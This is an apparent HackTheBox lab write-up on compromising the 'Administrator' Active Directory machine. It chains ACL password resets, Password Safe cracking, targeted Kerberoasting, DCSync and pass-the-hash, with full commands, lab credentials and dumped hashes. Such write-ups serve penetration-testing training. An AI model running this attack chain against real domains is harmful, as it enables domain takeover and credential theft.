---
title: 'Administrator: A Safe Bet — From ACL Chains to DCSync'
published: 2026-05-13
description: ''
image: ''
tags: ['Active Directory']
category: 'Penetration Tester'
draft: false 
lang: ''
---

# 1. Introduction
Administrator is a real‑world Active Directory compromise scenario that begins with nothing more than a single set of low‑privileged credentials. Using Olivia : ichliebedich, you must carefully navigate a web of ACL misconfigurations, chaining password resets through multiple users until you uncover a password‑protected safe that holds the keys to a WinRM session. From there, a targeted Kerberoasting attack leveraged through GenericWrite privileges yields yet another set of credentials, which ultimately unlocks DCSync rights and the entire domain. This machine is a masterclass in combining BloodHound‑driven attack path analysis, offline cracking with Hashcat, and classic Active Directory escalation techniques.


# 2. Reconnaissance

## 2.1 Nmap Scan

A full TCP scan reveals a typical domain controller plus an unusual FTP service.

```
$ nmap -sVC -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,...
         ...49664,49665,49666,49667,49668,56687,... 10.129.235.220
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp open  mc-nmf        .NET Message Framing
...
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-11-10T02:05:17
|_  start_date: N/A
```

Key observation: Kerberos (88), LDAP (389/636/3268/3269), SMB (445), WinRM (5985) and FTP (21) are all open. The presence of FTP on a DC is unusual and worth remembering.

## 2.2 Initial Credentials

The box provides the following starting credentials:

```
Username: Olivia
Password: ichliebedich
```

These work for SMB, LDAP, and Kerberos, but Olivia does **not** have WinRM access.

# 3. BloodHound Enumeration

To map the Active Directory environment, we collect data with [**BloodHound.py**](http://bloodhound.py/) (or **netexec**) using Olivia’s credentials:

```
$ python3 bloodhound.py -u Olivia -p 'ichliebedich' -d administrator.htb -c all --zip -ns 10.129.235.220
```

Alternatively, with netexec:

```
$ nxc ldap 10.129.232.56 -u Olivia -p 'ichliebedich' --bloodhound --collection All --dns-server 10.129.232.56
```

The resulting ZIP file is loaded into the BloodHound GUI. The “Shortest Path to Domain Admins” query immediately highlights the attack chain:

- **Olivia** has `GenericAll` over **Michael**.
- **Michael** can force a password change on **Benjamin**.
- **Benjamin** is a member of the `SHARE MODERATORS` group, which grants FTP access.

```
BloodHound Attack Path (textual representation)
================================================

  Olivia (GenericAll) --> Michael
    Michael (ForceChangePassword) --> Benjamin
      Benjamin (member of SHARE MODERATORS)
        FTP (port 21) accessible, contains Backup.psafe3
```

# 4. Lateral Movement – Password Resets

## 4.1 Reset Michael’s Password with Olivia

Using the `net rpc` utility (or PowerView), we set a new password for Michael:

```
$ net rpc password "michael" "P@ssw0rd" -U "Administrator.htb"/"Olivia"%"ichliebedich" -S 10.129.235.220
```

Or with PowerView:

```
$ powerview 'Olivia:ichliebedich@10.129.235.220' -d PV > Set-DomainUserPassword -Identity MICHAEL -AccountPassword 'P@ssw0rd'
```

Verify the new password works:

```
$ nxc smb 10.129.235.220 -u michael -p 'P@ssw0rd' --shares
```

## 4.2 Reset Benjamin’s Password with Michael

Now, as Michael, we force a password change on Benjamin:

```
$ net rpc password "benjamin" "P@ssw0rd" -U "Administrator.htb"/"michael"%"P@ssw0rd" -S 10.129.235.220
```

Benjamin’s new password is usable for SMB and FTP, but **not** for WinRM.

# 5. FTP Access and Password Safe Cracking

## 5.1 FTP Login and File Retrieval

Benjamin belongs to the `SHARE MODERATORS` group, which grants access to the FTP server on port 21:

```
$ ftp BENJAMIN@10.129.150.35
ftp> get Backup.psafe3
```

The file `Backup.psafe3` is a **Password Safe** database, comparable to a KeePass database, protected by a master password.

## 5.2 Cracking the Master Password

We use **hashcat** with the **5200** mode (Password Safe v3) and the rockyou wordlist:

```
$ hashcat Backup.psafe3 /usr/share/wordlists/rockyou.txt -m 5200
```

Hashcat quickly recovers the master password:

```
Backup.psafe3:tekieromucho
```

## 5.3 Extracting Credentials from Password Safe

Install **Password Safe** ([pwsafe.org](http://pwsafe.org/)) on a Windows machine, open the `Backup.psafe3` file, and enter the master password `tekieromucho`. The vault contains entries for several users, including:

```
emily : UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

**Why Emily?** BloodHound shows that Emily is a member of the `Remote Management Users` group, meaning she can connect via WinRM.

# 6. User Flag – Access as Emily

Log in with Evil‑WinRM using Emily’s password:

```
$ evil-winrm -i 10.129.150.35 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

On the desktop, the user flag can be read:

```
C:\\Users\\emily\\Desktop> type user.txt
[REDACTED]
```

The flag is unique to each HTB instance; submit yours on the platform.

# 7. Privilege Escalation – Targeted Kerberoasting

## 7.1 BloodHound Path: Emily → Ethan

Further analysis of the BloodHound data reveals that **Emily** has `GenericWrite` permissions on **Ethan**. This allows us to perform a **Targeted Kerberoasting** attack: we can temporarily add a fake Service Principal Name (SPN) to Ethan’s account, request a Kerberos service ticket (TGS) for that SPN, and crack the ticket offline.

```
BloodHound Path (textual representation)
================================================

Emily (GenericWrite) --> Ethan (DCSync / GetChangesAll) --> Administrator
```

## 7.2 Running [targetedKerberoast.py](http://targetedkerberoast.py/)

We use the `targetedKerberoast.py` script from the “targetedKerberoast” GitHub repository:

```
$ python3 targetedKerberoast.py -v -d ADMINISTRATOR.HTB -u EMILY -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --dc-ip 10.129.235.220 --request-user ethan
```

The script outputs a Kerberos TGS hash (type 13100) for the user `ethan`.

## 7.3 Cracking the TGS Hash

Save the hash to a file and crack it with hashcat:

```
$ hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt
```

The password cracks almost instantly:

```
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$...:limpbizkit
```

We now have Ethan’s plain‑text password: `limpbizkit`.

# 8. DCSync and Domain Admin

## 8.1 Ethan Has DCSync Rights

BloodHound confirms that **Ethan** holds `GetChangesAll` rights on the domain, which is equivalent to DCSync privileges. This allows us to dump the NTDS.dit hashes of all domain users.

## 8.2 Using [secretsdump.py](http://secretsdump.py/)

We use Impacket’s `secretsdump.py` (or `impacket-secretsdump`) to extract the hashes:

```
$ impacket-secretsdump <ETHAN:limpbizkit@10.129.235.220>
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
...
```

The Administrator’s NTLM hash is:

```
3dc553ce4b9fd20bd016e098d2d2fd2e
```

## 8.3 Pass‑the‑Hash to Administrator

Using the extracted NT hash, we perform a Pass‑the‑Hash login with Evil‑WinRM:

```
$ evil-winrm -i 10.129.150.35 -u administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e"
```

We now have full Domain Admin access.


# 9. Complete Attack Chain Summary

1. **Reconnaissance** – Nmap scan identifies a Domain Controller with an FTP service.
2. **BloodHound** – Using Olivia’s credentials, map the AD: Olivia → Michael → Benjamin.
3. **Password Reset Chain** – Abuse `GenericAll` to change Michael’s password, then use Michael to change Benjamin’s password.
4. **FTP Access** – Benjamin logs into FTP, retrieves `Backup.psafe3`.
5. **Password Safe Cracking** – Hashcat (mode 5200) cracks the master password; extract Emily’s credentials.
6. **User Flag** – Emily has WinRM access; login with Evil‑WinRM and capture `user.txt`.
7. **Targeted Kerberoasting** – Emily’s `GenericWrite` on Ethan allows adding an SPN; crack the resulting TGS hash (mode 13100) to obtain Ethan’s password.
8. **DCSync** – Ethan has DCSync rights; use `secretsdump.py` to dump Administrator’s NTLM hash.
9. **Pass‑the‑Hash** – Authenticate as Administrator via Evil‑WinRM and read `root.txt`.

# 10. Tools Used

| Tool | Purpose |
| --- | --- |
| **Nmap** | Port scanning and service detection |
| [**BloodHound.py](http://bloodhound.py/) / netexec** | AD data collection and attack‑path mapping |
| **BloodHound (GUI)** | Visual analysis of AD relationships |
| **net rpc / PowerView** | Password‑reset via RPC and PowerShell |
| **FTP client** | File transfer |
| **hashcat (mode 5200 & 13100)** | Cracking Password Safe master password and Kerberos TGS hash |
| **Password Safe ([pwsafe.org](http://pwsafe.org/))** | Viewing the decrypted password database |
| [**targetedKerberoast.py**](http://targetedkerberoast.py/) | Adding an SPN and extracting a TGS hash |
| **impacket‑secretsdump** | DCSync attack to dump NTDS hashes |
| **Evil‑WinRM** | Remote PowerShell session via WinRM |

